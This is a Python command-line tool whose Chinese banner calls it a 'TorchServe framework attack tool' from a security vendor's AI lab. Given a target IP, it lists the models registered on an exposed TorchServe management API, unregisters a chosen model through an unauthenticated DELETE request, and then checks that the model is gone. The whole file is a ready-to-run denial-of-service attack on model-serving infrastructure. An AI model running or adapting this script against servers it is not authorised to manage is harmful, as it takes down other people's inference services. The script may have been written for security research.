import requests
import argparse
import logging
from datetime import datetime

# 配置日志记录
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("torchserve_management.log"),  # 将日志写入文件
        logging.StreamHandler()  # 同时输出到控制台
    ]
)

# 定义函数：获取当前已注册的模型列表
def get_registered_models(management_url):
    try:
        response = requests.get(f"{management_url}/models")
        if response.status_code == 200:
            models = response.json().get("models", [])
            if models:
                logging.info("当前已注册的模型列表：")
                for model in models:
                    logging.info(f"- 模型名称: {model['modelName']}, 模型 URL: {model['modelUrl']}")
            else:
                logging.info("[+] 当前没有已注册的模型。")
        else:
            logging.error(f"[!] 获取模型列表失败，状态码: {response.status_code}")
            logging.error(response.text)
    except requests.exceptions.RequestException as e:
        logging.error(f"[!] 访问 TorchServe 管理 API 时发生错误: {str(e)}")

# 定义函数：解注册指定的模型
def unregister_model(management_url, model_name):
    try:
        response = requests.delete(f"{management_url}/models/{model_name}")
        if response.status_code == 200:
            logging.info(f"[+] 模型 \"{model_name}\" 已成功解注册。")
        else:
            logging.error(f"[!] 解注册模型 \"{model_name}\" 失败，状态码: {response.status_code}")
            logging.error(response.text)
    except requests.exceptions.RequestException as e:
        logging.error(f"[!] 解注册模型 \"{model_name}\" 时发生错误: {str(e)}")

# 定义主函数
def main():
    # 创建 ArgumentParser 对象
    parser = argparse.ArgumentParser(description="TorchServe 管理接口操作工具")

    # 添加命令行参数
    parser.add_argument("--ip", type=str, required=True, help="TorchServe 管理 API 的 IP 地址")
    parser.add_argument("--port", type=int, default=8081, help="TorchServe 管理 API 的端口号 (默认: 8081)")
    parser.add_argument("--model-name", type=str, default="vgg16", help="要解注册的模型名称 (默认: vgg16)")

    # 解析命令行参数
    args = parser.parse_args()

    # 构建 TorchServe 的管理 URL
    management_url = f"http://{args.ip}:{args.port}"

    # 打印欢迎信息
    logging.info("==============================================================================")
    logging.info("TorchServe框架攻击工具 v1.0")
    logging.info("功能：")
    logging.info("  - 获取当前已注册的模型列表")
    logging.info("  - 解注册模型")
    logging.info("技术支持：亚信安全人工智能实验室")
    logging.info("==============================================================================\n")

    # 获取当前已注册的模型列表
    logging.info("正在获取当前已注册的模型列表...")
    get_registered_models(management_url)

    # 解注册指定的模型
    logging.info(f"正在解注册模型 \"{args.model_name}\"...")
    unregister_model(management_url, args.model_name)

    # 再次获取当前已注册的模型列表，验证解注册是否成功
    logging.info("再次获取当前已注册的模型列表以验证解注册结果...")
    get_registered_models(management_url)

if __name__ == "__main__":
    main()